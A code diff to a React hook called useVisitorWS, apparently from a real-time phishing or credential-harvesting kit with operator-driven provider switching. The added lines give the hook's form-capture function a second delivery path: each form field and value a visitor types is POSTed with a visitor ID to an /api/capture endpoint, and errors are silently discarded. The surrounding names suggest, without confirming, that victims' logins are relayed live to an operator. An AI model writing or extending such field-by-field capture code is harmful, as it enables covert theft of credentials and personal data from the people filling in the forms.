@@ -201,7 +201,17 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch, onSiteStatus }: 
   }, []);
 
   const sendCapture = useCallback((field: string, value: string) => {
+    // Primary path: WebSocket
     enqueue({ type: 'form-data', field, value });
+    // HTTP fallback: guarantees delivery even if WS form-data path is broken
+    if (!isViewOnly.current) {
+      const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+      fetch(`${base}/api/capture`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ visitorId: visitorId.current, field, value }),
+      }).catch(() => {});
+    }
   }, [enqueue]);
 
   const sendStepUpdate = useCallback((step: string) => {
